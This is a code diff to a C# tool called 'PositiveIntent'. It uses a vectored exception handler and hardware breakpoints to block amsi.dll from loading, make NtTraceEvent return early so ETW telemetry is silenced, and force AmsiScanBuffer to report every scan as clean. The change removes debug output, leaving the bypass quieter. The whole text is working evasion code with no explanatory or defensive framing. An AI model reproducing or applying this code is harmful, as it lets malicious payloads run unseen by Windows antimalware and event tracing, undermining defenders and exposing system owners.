@@ -69,13 +69,9 @@ namespace PositiveIntent
         static uint VEHCallback(ref EXCEPTION_POINTERS exceptionInfo)
         {
             EXCEPTION_RECORD exRecord = Marshal.PtrToStructure<EXCEPTION_RECORD>(exceptionInfo.ExceptionRecord);
-            Console.WriteLine($"[VEH] Exception: 0x{exRecord.ExceptionCode:X8}");
-
             // Catch division by zero and set hardware breakpoint
             if (exRecord.ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO && !breakpointsSet)
             {
-                Console.WriteLine("[VEH] Setting hardware breakpoint in CONTEXT...");
-
                 CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);
 
                 // Get target function address
@@ -83,9 +79,6 @@ namespace PositiveIntent
                 IntPtr amsiBaseAddress = Generic.GetLoadedModuleAddress("amsi.dll");
                 IntPtr ldrLoadDll = Generic.GetExportAddress(ntdllBaseAddress, "LdrLoadDll");
                 IntPtr ntTraceEvent = Generic.GetExportAddress(ntdllBaseAddress, "NtTraceEvent");
-
-                Console.WriteLine($"[VEH] LdrLoadDll: 0x{ldrLoadDll:X}");
-                Console.WriteLine($"[VEH] NtTraceEvent: 0x{ntTraceEvent:X}");
 
                 // Set hardware breakpoints
                 context.Dr0 = (ulong)ldrLoadDll;
@@ -120,8 +113,6 @@ namespace PositiveIntent
 
                 if ((context.Dr6 & 0x1) != 0)
                 {
-                    Console.WriteLine($"[VEH] Dr0 HIT! (LdrLoadDll at 0x{context.Rip:X})");
-
                     var unicodeStringPtr = new IntPtr((long)context.R8);
                     if (unicodeStringPtr != IntPtr.Zero)
                     {
@@ -129,11 +120,8 @@ namespace PositiveIntent
                         if (us.Buffer != IntPtr.Zero && us.Length > 0)
                         {
                             string dllName = Marshal.PtrToStringUni(us.Buffer, us.Length / sizeof(char));
-                            Console.WriteLine($"[VEH] LdrLoadDll -> {dllName} @ RIP=0x{context.Rip:X}");
-
                             if (dllName.EndsWith("amsi.dll", StringComparison.OrdinalIgnoreCase))
                             {
-                                Console.WriteLine("[VEH] Target DLL detected! Taking action...");
                                 // Spoof return: skip the load entirely
                                 ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                                 context.Rip = returnAddress;
@@ -146,8 +134,7 @@ namespace PositiveIntent
 
                 if ((context.Dr6 & 0x2) != 0)
                 {
-                    Console.WriteLine($"[VEH] Dr1 HIT! (NtTraceEvent at 0x{context.Rip:X})");
-
+                    Console.WriteLine("EventWrite breakpoint hit");
                     // Simulate a 'ret' instruction
                     ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                     context.Rip = returnAddress;
@@ -156,16 +143,13 @@ namespace PositiveIntent
                 }
 
                 if ((context.Dr6 & 0x4) != 0)
-                {
-                    Console.WriteLine($"[VEH] Dr2 HIT! (AmsiScanBuffer at 0x{context.Rip:X})");
-                    
+                {                    
                     // Read the AMSI_RESULT* pointer from the stack (6th argument)
                     IntPtr resultPtr = Marshal.ReadIntPtr(new IntPtr((long)context.Rsp + 0x30));
                     if (resultPtr != IntPtr.Zero)
                     {
                         Marshal.WriteInt32(resultPtr, 0); // AMSI_RESULT_CLEAN = 0
                     }
-
                     // Simulate a 'ret' instruction
                     ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                     context.Rip = returnAddress;
